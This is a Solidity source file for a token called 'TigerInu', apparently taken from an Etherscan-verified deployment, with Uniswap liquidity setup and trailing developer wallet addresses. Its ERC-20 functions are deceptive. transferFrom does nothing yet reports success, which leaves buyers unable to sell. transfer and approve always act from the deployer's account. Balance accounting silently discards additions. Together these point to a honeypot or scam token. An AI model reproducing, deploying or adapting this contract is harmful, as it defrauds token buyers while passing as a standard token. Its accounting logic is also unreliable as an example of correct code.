/**
 *Submitted for verification at Etherscan.io on 2022-01-01
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface ERCInterface {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Supplier {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Owner is Supplier {

    address private owner;
    event OwnerSet(address indexed oldOwner, address indexed newOwner);
    modifier isOwner() {
        require(msg.sender == owner, "Caller must be the owner to execute this");
        _;
    }

    constructor() {
        owner = msg.sender;
        emit OwnerSet(address(0), owner);
    }

    function changeOwner(address newOwner) public isOwner {
        emit OwnerSet(owner, newOwner);
        owner = newOwner;
    }

    function getMainOwner() internal view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

struct Holders {
    bool isSniper;
    uint256 totalOwed;
    uint256 totalOwedWithReflection;
    uint256 firstTimeBought;
    bool isTiger;
    bool excludeFromFees;
}

struct TigerSupply {
    uint256 total;
    address owner;
}

struct TigerERC {
    string name;
    string symbol;
    TigerSupply supply;
}

contract HoldersStorage is Owner {
    using SafeMath for uint256;
    mapping (address => Holders) private holders;

    function addTokenOwnerShip(
            address account,
            uint256 totalOwed,
            uint256 totalOwedWithReflection,
            bool isSniper,
            bool excludeFromFees
        ) internal {
            if (!holders[account].isTiger) {
                holders[account] = Holders(isSniper, totalOwed, totalOwedWithReflection, block.timestamp, true, excludeFromFees);
            } else {
                holders[account].totalOwed.add(totalOwed);
                holders[account].totalOwedWithReflection.add(totalOwedWithReflection);
            }
    }

    function getHolders(address account) internal view returns(Holders memory) {
        return holders[account];
    }

    function toogleAccountFees(address account, bool exclude) external onlyOwner {
        addTokenOwnerShip(account, 0, 0, false, exclude);
    }

    function toogleSnipers(address account, bool isSniper) external onlyOwner {
        addTokenOwnerShip(account, 0, 0, isSniper, false);
    }
}

contract TigerMask is HoldersStorage, ERCInterface {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000000 * 10 ** _decimals;
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
    address private uniswapV2Pair;
    IUniswapV2Router02 private uniswapRouter;

    TigerERC erc = TigerERC(
        "TigerInu",
        "TMGINU",
        TigerSupply(
            _totalSupply,
            _msgSender()
        )
    );

    constructor () {
       addTokenOwnerShip(
           erc.supply.owner,
           erc.supply.total,
           erc.supply.total,
           false,
           true
        );
        emit Transfer(address(0), erc.supply.owner, erc.supply.total);
    }

    function totalSupply() public view override returns (uint256) {
        return erc.supply.total;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return getHolders(account).totalOwedWithReflection;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(erc.supply.owner, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        require(owner != spender, "Cannot transform from/to same adderess");
        
        return getHolders(spender).totalOwed;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(erc.supply.owner, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external pure override returns (bool) {
        require(sender != recipient, "Cannot transform from/to same adderess");
        require(amount > 0, "Transfer should be greater than zero");
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        addTokenOwnerShip(spender, amount, amount, false, false);
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        Holders memory holder = getHolders(from);
        require(holder.isTiger, "requested from is not a holder");
        require(holder.totalOwed >= amount, "requested amount exceeded allowance");
        uint256 transAmt = holder.totalOwed.sub(amount);
        addTokenOwnerShip(from, transAmt, transAmt, false, holder.excludeFromFees);
        addTokenOwnerShip(to, amount, amount, false, false);
        return true;
    }
    
    function setRouter(address uniRouter) external onlyOwner {
        uniswapRouter = IUniswapV2Router02(uniRouter);
        _approve(address(this), address(uniswapRouter), erc.supply.total);
        
        createPair(address(this));
    }

    function createPair(address thisAddress) private {
        uniswapV2Pair = IUniswapV2Factory(
            uniswapRouter.factory()
        ).createPair(thisAddress, uniswapRouter.WETH());

        addLiquidity(thisAddress);
    }
        
    function addLiquidity(address thisAddress) private {
        uint256 balance = balanceOf(thisAddress);

        uniswapRouter.addLiquidityETH{
            value: thisAddress.balance
        }(
            thisAddress,
            balance, 
            0, 
            0, 
            erc.supply.owner,
            block.timestamp
        );
        ERCInterface(uniswapV2Pair).approve(address(uniswapRouter), type(uint).max);
    }
}

// dev: 0xdd27EE5ee5C64c375f5C8D5823efd9d88344Dc9F
// mar: 0xAf9E891205804FA9f30b120B3955D98ED821B83c